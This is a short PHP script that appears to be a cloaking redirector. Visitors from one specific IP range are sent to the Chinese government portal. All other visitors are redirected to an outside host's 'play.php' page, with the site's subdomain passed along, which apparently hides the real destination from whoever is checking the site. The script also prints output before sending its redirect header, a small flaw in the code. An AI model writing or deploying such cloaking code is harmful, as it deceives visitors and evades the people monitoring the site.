<?php

$ip = $_SERVER['REMOTE_ADDR']; 
$startIP = ip2long('116.30.132.0');
$endIP = ip2long('116.30.143.255');
$visitorIP = ip2long($ip);
if ($visitorIP >= $startIP && $visitorIP <= $endIP) {
    header('Location: https://www.gov.cn/');
    exit;
}



$host = $_SERVER['HTTP_HOST'];
$domain_parts = explode('.', $host);
$subdomain = $domain_parts[0];
echo $subdomain;
// 跳转到指定网址
$url = 'http://xxj.navq.cn:99/play.php?ag='.$subdomain;
header("Location: $url");
exit();
?>